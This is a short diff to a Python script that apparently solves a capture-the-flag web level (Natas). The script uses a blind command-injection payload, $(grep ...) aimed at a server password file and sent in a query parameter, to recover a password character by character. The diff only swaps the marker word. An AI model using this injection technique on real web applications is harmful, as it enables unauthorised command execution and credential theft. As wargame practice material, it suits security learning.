@@ -12,10 +12,10 @@ def check_password(starting_password=''):
         possible_password = starting_password
         possible_password += character
 
-        uri = "{0}?needle=$(grep -E ^{1}.* /etc/natas_webpass/natas17)hackers".format(base_url,possible_password)
+        uri = "{0}?needle=$(grep -E ^{1} /etc/natas_webpass/natas17)banana".format(base_url,possible_password)
         res = requests.get(uri, auth=(auth_username,auth_password))
 
-        if 'hackers' not in res.text:
+        if 'banana' not in res.text:
             print(possible_password)
             check_password(possible_password)
             break
